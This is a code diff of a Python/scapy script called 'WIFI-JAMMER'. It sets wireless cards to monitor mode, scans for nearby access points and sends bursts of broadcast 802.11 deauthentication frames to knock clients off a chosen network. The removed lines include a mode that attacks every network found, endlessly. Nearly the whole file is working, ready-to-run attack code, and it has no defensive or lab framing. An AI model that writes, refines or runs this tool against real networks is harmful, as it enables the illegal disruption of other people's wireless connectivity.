@@ -1,192 +1,189 @@
+#!/usr/bin/env python3
 import os
-import subprocess
+import re
 import sys
 import time
-from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11Beacon, Dot11Elt
+import shutil
+import subprocess
+from scapy.all import (RadioTap, Dot11, Dot11Deauth, sendp, sniff, 
+                      Dot11Beacon, Dot11Elt, conf)
 
-# Define green color for text
+# Colors
 GREEN = "\033[92m"
+YELLOW = "\033[93m"
+RED = "\033[91m"
 RESET = "\033[0m"
 
+def check_dependencies():
+    """Verify required tools are installed"""
+    missing = []
+    
+    # Check scapy
+    try:
+        import scapy
+    except ImportError:
+        missing.append("scapy (pip install scapy)")
+    
+    # Check iwconfig
+    if not shutil.which('iwconfig'):
+        missing.append("wireless-tools (apt install wireless-tools)")
+    
+    if missing:
+        print(f"{RED}[-] Missing dependencies:{RESET}")
+        for dep in missing:
+            print(f"  - {dep}")
+        sys.exit(1)
+
 def display_ascii_art():
-    # Generate ASCII art using toilet and format it
-    ascii_art = subprocess.run(
-        ['toilet', '-f', 'bigmono12', '-w', str(os.get_terminal_size().columns), 'WIFI-JAMMER'],
-        capture_output=True, text=True
-    ).stdout
-
-    # Add indentation and color (bold green)
-    ascii_art = GREEN + ascii_art.replace("\n", "\n      ") + RESET
-
-    # Display the ASCII art
-    print(ascii_art)
-
-def display_details():
-    """
-    Display your details in a centered and presentable format.
-    """
-    # Define the text to display
-    details = [
-        "GitHub: dy-glitch | Instagram: gangnapper",
-        "Kindly follow my channel!",
-        "Have fun and a blessed day! 🎉🙏"
-    ]
-
-    # Define the width of the display (adjust as needed)
-    width = 60
-
-    # Print a decorative border
-    print("\n" + "=" * width)
-
-    # Print each line centered
-    for line in details:
-        print(line.center(width))
-
-    # Print another decorative border
-    print("=" * width + "\n")
+    """Show styled title"""
+    try:
+        art = subprocess.run(
+            ['toilet', '-f', 'bigmono12', '-w', '100', 'WIFI-JAMMER'],
+            capture_output=True, text=True
+        ).stdout
+        print(f"{GREEN}{art}{RESET}")
+    except:
+        print(f"{GREEN}\n  WIFI JAMMER\n{RESET}")
 
 def get_wireless_interfaces():
-    """
-    Get a list of all wireless interfaces.
-    """
-    interfaces = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
-    interfaces = [line.split()[0] for line in interfaces.splitlines() if "IEEE 802.11" in line]
+    """Get available wireless interfaces"""
+    interfaces = []
+    try:
+        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
+        interfaces = [line.split()[0] 
+                     for line in result.stdout.splitlines() 
+                     if "IEEE 802.11" in line]
+    except Exception as e:
+        print(f"{RED}[-] Error detecting interfaces: {e}{RESET}")
     return interfaces
 
 def set_monitor_mode(interface):
-    """
-    Set the given interface to monitor mode.
-    """
-    print(f"{GREEN}[*] Setting {interface} to monitor mode...{RESET}")
+    """Configure interface in monitor mode"""
+    print(f"{YELLOW}[*] Configuring {interface}...{RESET}")
+    
+    commands = [
+        ["ifconfig", interface, "down"],
+        ["iwconfig", interface, "mode", "monitor"],
+        ["ifconfig", interface, "up"]
+    ]
+    
+    for cmd in commands:
+        try:
+            subprocess.run(["sudo"] + cmd, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"{RED}[-] Failed: {' '.join(cmd)} - {e}{RESET}")
+            return False
+    
+    # Verify mode
+    result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
+    if "Mode:Monitor" in result.stdout:
+        print(f"{GREEN}[+] {interface} in monitor mode{RESET}")
+        return True
+    else:
+        print(f"{RED}[-] Failed to set monitor mode{RESET}")
+        return False
+
+def scan_networks(interface, duration=10):
+    """Scan for nearby WiFi networks"""
+    networks = {}
+    print(f"{YELLOW}[*] Scanning for {duration}s...{RESET}")
+
+    def packet_handler(pkt):
+        if pkt.haslayer(Dot11Beacon):
+            try:
+                bssid = pkt[Dot11].addr2
+                ssid = pkt[Dot11Elt].info.decode('utf-8', 'ignore') or "<hidden>"
+                try:
+                    dbm = pkt.dBm_AntSignal
+                except:
+                    dbm = "N/A"
+                
+                if bssid not in networks:
+                    networks[bssid] = {
+                        'ssid': ssid,
+                        'dbm': dbm,
+                        'channel': int(ord(pkt[Dot11Elt:3].info))
+                    }
+            except Exception as e:
+                pass
+
+    sniff(iface=interface, prn=packet_handler, timeout=duration)
+    return networks
+
+def deauth_target(interface, target_bssid, count=10, interval=0.1, duration=30):
+    """Launch deauthentication attack"""
+    print(f"{YELLOW}[*] Targeting {target_bssid}{RESET}")
+    
+    # Target all clients (broadcast)
+    packet = RadioTap() / Dot11(
+        addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
+        addr2=target_bssid,          # AP MAC
+        addr3=target_bssid            # AP MAC
+    ) / Dot11Deauth(reason=7)         # 7 = Class 3 frame received from nonassociated STA
+    
+    start_time = time.time()
     try:
-        # Bring the interface down
-        subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
-        # Set monitor mode
-        subprocess.run(["sudo", "iwconfig", interface, "mode", "monitor"], check=True)
-        # Bring the interface up
-        subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
-        print(f"{GREEN}[+] {interface} is now in monitor mode.{RESET}")
-    except subprocess.CalledProcessError as e:
-        print(f"{GREEN}[-] Failed to set {interface} to monitor mode: {e}{RESET}")
-        sys.exit(1)
-
-def set_all_interfaces_to_monitor_mode():
-    """
-    Set all wireless interfaces to monitor mode.
-    """
-    interfaces = get_wireless_interfaces()
-    if not interfaces:
-        print(f"{GREEN}[-] No wireless interfaces found.{RESET}")
-        sys.exit(1)
-
-    for interface in interfaces:
-        set_monitor_mode(interface)
-
-def scan_wifi(interface):
-    """
-    Scan for Wi-Fi networks and return a list of BSSIDs.
-    """
-    print(f"{GREEN}[*] Scanning for Wi-Fi networks on {interface}...{RESET}")
-    networks = set()
-
-    def packet_handler(packet):
-        if packet.haslayer(Dot11Beacon):
-            bssid = packet[Dot11].addr2
-            ssid = packet[Dot11Elt].info.decode() if packet[Dot11Elt].info else "<hidden>"
-            networks.add((bssid, ssid))
-
-    # Start sniffing for 10 seconds
-    sniff(iface=interface, prn=packet_handler, timeout=10)
-
-    if not networks:
-        print(f"{GREEN}[-] No Wi-Fi networks found.{RESET}")
-        sys.exit(1)
-
-    print(f"{GREEN}[+] Available Wi-Fi networks:{RESET}")
-    for i, (bssid, ssid) in enumerate(networks):
-        print(f"{GREEN}  {i + 1}. BSSID: {bssid}, SSID: {ssid}{RESET}")
-
-    return [bssid for bssid, _ in networks]
-
-def deauthenticate_all(interface, bssids):
-    print(f"{GREEN}[*] Starting persistent deauthentication attack...{RESET}")
-    try:
-        while True:
-            for bssid in bssids:
-                print(f"{GREEN}[*] Deauthenticating network with BSSID: {bssid}{RESET}")
-                sendp(RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7), iface=interface, count=100, inter=0.01, verbose=False)
-            time.sleep(1)  # Wait before repeating
+        while time.time() - start_time < duration:
+            sendp(packet, iface=interface, count=count, inter=interval, verbose=False)
+            print(f"{GREEN}[+] Sent {count} deauth packets{RESET}")
+            time.sleep(1)
     except KeyboardInterrupt:
-        print(f"\n{GREEN}[*] Stopping deauthentication attack.{RESET}")
-
-def deauthenticate_single(interface, bssid):
-    """
-    Deauthenticate a single Wi-Fi network persistently.
-    """
-    print(f"{GREEN}[*] Starting persistent deauthentication attack on BSSID: {bssid}{RESET}")
-    try:
-        while True:
-            sendp(RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7), iface=interface, count=100, inter=0.01, verbose=False)
-            time.sleep(1)  # Wait before repeating
-    except KeyboardInterrupt:
-        print(f"\n{GREEN}[*] Stopping deauthentication attack.{RESET}")
+        print(f"\n{YELLOW}[!] Stopped attack{RESET}")
 
 def main():
-    # Display the ASCII art
+    check_dependencies()
     display_ascii_art()
-
-    # Display your details
-    display_details()
-
-    # List available interfaces
+    
+    # Get interfaces
     interfaces = get_wireless_interfaces()
     if not interfaces:
-        print(f"{GREEN}[-] No wireless interfaces found.{RESET}")
+        print(f"{RED}[-] No wireless interfaces found{RESET}")
         sys.exit(1)
-
-    print(f"{GREEN}[*] Available interfaces:{RESET}")
-    for i, iface in enumerate(interfaces):
-        print(f"{GREEN}  {i + 1}. {iface}{RESET}")
-
-    # Ask if the user wants to set all interfaces to monitor mode
-    monitor_mode = input(f"{GREEN}[*] Do you want to set all wireless interfaces to monitor mode? (yes/no): {RESET}").strip().lower()
-    if monitor_mode == "yes":
-        set_all_interfaces_to_monitor_mode()
-    elif monitor_mode != "no":
-        print(f"{GREEN}[-] Invalid choice. Exiting.{RESET}")
-        sys.exit(1)
-
-    # Choose interface for scanning and deauthentication
-    try:
-        iface_choice = int(input(f"{GREEN}[*] Choose an interface (1-{len(interfaces)}): {RESET}")) - 1
-        if iface_choice not in range(len(interfaces)):
-            print(f"{GREEN}[-] Invalid choice. Exiting.{RESET}")
-            sys.exit(1)
-        interface = interfaces[iface_choice]
-    except ValueError:
-        print(f"{GREEN}[-] Invalid input. Exiting.{RESET}")
-        sys.exit(1)
-
-    # Scan for Wi-Fi networks
-    bssids = scan_wifi(interface)
-
-    # Choose deauthentication mode
-    mode = input(f"{GREEN}[*] Do you want to deauthenticate all Wi-Fi networks or a single Wi-Fi network? (all/single): {RESET}").strip().lower()
     
-    if mode == "all":
-        deauthenticate_all(interface, bssids)
-    elif mode == "single":
-        bssid = input(f"{GREEN}[*] Enter the BSSID of the target network (e.g., 00:11:22:33:44:55): {RESET}").strip()
-        if not bssid:
-            print(f"{GREEN}[-] BSSID cannot be empty. Exiting.{RESET}")
+    # Interface selection
+    print(f"{GREEN}[+] Available interfaces:{RESET}")
+    for i, iface in enumerate(interfaces):
+        print(f"  {i+1}. {iface}")
+    
+    try:
+        choice = int(input(f"{YELLOW}[?] Select interface: {RESET}")) - 1
+        iface = interfaces[choice]
+    except (ValueError, IndexError):
+        print(f"{RED}[-] Invalid selection{RESET}")
+        sys.exit(1)
+    
+    # Set monitor mode
+    if not set_monitor_mode(iface):
+        sys.exit(1)
+    
+    # Network scan
+    networks = scan_networks(iface)
+    if not networks:
+        print(f"{RED}[-] No networks found{RESET}")
+        sys.exit(1)
+    
+    print(f"\n{GREEN}[+] Discovered networks:{RESET}")
+    for i, (bssid, info) in enumerate(networks.items()):
+        print(f"  {i+1}. {info['ssid']} ({bssid}) | Channel: {info['channel']} | Signal: {info['dbm']} dBm")
+    
+    # Target selection
+    try:
+        target = input(f"{YELLOW}[?] Enter target BSSID: {RESET}").strip()
+        if target not in networks:
+            print(f"{RED}[-] Invalid BSSID{RESET}")
             sys.exit(1)
-        deauthenticate_single(interface, bssid)
-    else:
-        print(f"{GREEN}[-] Invalid choice. Please choose 'all' or 'single'.{RESET}")
+    except KeyboardInterrupt:
+        sys.exit(0)
+    
+    # Launch attack
+    try:
+        deauth_target(iface, target)
+    except PermissionError:
+        print(f"{RED}[-] Need root privileges!{RESET}")
+        sys.exit(1)
 
 if __name__ == "__main__":
-    # Ensure the script is run with sudo
     if os.geteuid() != 0:
-        print(f"{GREEN}[-] This script must be run as root. Use 'sudo'.{RESET}")
+        print(f"{RED}[-] Run as root!{RESET}")
         sys.exit(1)
     main()
